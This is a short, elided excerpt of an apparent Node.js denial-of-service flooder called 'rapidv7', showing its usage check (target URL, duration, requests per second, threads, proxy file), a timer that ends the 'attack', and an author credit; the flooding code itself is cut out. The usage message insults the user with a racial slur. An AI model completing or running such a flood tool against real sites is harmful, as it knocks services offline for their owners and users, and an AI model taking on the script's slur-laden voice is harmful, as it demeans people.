...
const net = require("net");
 ...
 if (process.argv.length < 8){
    console.log(`\x1b[31mAh nigga you are dumbass for use lololol the command
node rapidv7 web url time rps thread proxyfile.txt\x1b[0m`);
    process.exit();
 }
 let val 
 let isp
 ...
 setTimeout(function() {
    console.log("Attack Ended, Code By alex541くん <3");
    process.exit(1);
 }, args.time * 1000);
